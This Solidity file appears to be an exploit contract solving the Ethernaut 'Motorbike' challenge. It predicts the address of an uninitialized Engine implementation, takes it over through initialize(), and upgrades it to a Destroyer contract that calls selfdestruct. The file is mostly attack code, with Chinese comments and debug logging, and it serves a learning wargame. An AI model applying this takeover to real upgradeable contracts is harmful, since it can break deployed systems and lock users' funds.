// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/console.sol";

interface IEthernaut {
    function createLevelInstance(address level) external payable returns (address);
}

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract Destroyer {
    function Ching676476() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeExploit {
    address public constant ETHERNAUT = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address public constant MOTORBIKE_LEVEL = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    
    function solve(uint256 levelNonce) external payable returns (address motorbike) {
        console.log("[Contract] solve() called with nonce:", levelNonce);
        
        // 预计算 Engine 地址（nonce N）
        address engine = _computeCreateAddress(MOTORBIKE_LEVEL, levelNonce);
        console.log("[Contract] Predicted engine:", engine);
        
        // 创建实例（会部署 Engine at nonce N, Proxy at nonce N+1）
        console.log("[Contract] Calling createLevelInstance...");
        console.log("[Contract] ETHERNAUT address:", ETHERNAUT);
        console.log("[Contract] MOTORBIKE_LEVEL address:", MOTORBIKE_LEVEL);
        console.log("[Contract] msg.value:", msg.value);
        
        // 尝试直接调用看看会不会有更多错误信息
        (bool success, bytes memory returnData) = ETHERNAUT.call{value: msg.value}(
            abi.encodeWithSignature("createLevelInstance(address)", MOTORBIKE_LEVEL)
        );
        
        console.log("[Contract] createLevelInstance success:", success);
        console.log("[Contract] returnData length:", returnData.length);
        
        if (!success) {
            if (returnData.length > 0) {
                // 有错误信息
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            } else {
                revert("createLevelInstance failed with no reason");
            }
        }
        
        // 如果返回数据为空，说明是 EIP-7702 delegated call 的问题
        // 让我们尝试另一种方式：从事件中获取地址或者预测
        if (returnData.length == 0) {
            console.log("[Contract] WARNING: returnData is empty!");
            console.log("[Contract] This might be an EIP-7702 issue with return values");
            console.log("[Contract] Trying to predict motorbike address instead...");
            
            // 预测 Proxy 地址（nonce N+1）
            motorbike = _computeCreateAddress(MOTORBIKE_LEVEL, levelNonce + 1);
            console.log("[Contract] Predicted motorbike (proxy):", motorbike);
        } else {
            motorbike = abi.decode(returnData, (address));
            console.log("[Contract] Instance created from returnData, motorbike:", motorbike);
        }
        
        // 初始化 Engine（使我们成为 upgrader）
        console.log("[Contract] Calling engine.initialize()...");
        IEngine(engine).initialize();
        console.log("[Contract] Engine initialized");
        
        // 部署 Destroyer 合约
        console.log("[Contract] Deploying Destroyer...");
        Destroyer destroyer = new Destroyer();
        console.log("[Contract] Destroyer deployed at:", address(destroyer));
        
        // 升级 Engine 到 Destroyer 并调用 selfdestruct
        console.log("[Contract] Calling upgradeToAndCall...");
        bytes memory data = abi.encodeWithSignature("Ching676476()");
        IEngine(engine).upgradeToAndCall(address(destroyer), data);
        console.log("[Contract] upgradeToAndCall completed");
        
        return motorbike;
    }
    
    function _computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) {
        if (nonce == 0x00) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))))));
        }
        if (nonce <= 0x7f) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))))));
        }
        if (nonce <= 2**8 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))))));
        }
        if (nonce <= 2**16 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))))));
        }
        if (nonce <= 2**24 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce))))));
    }
}
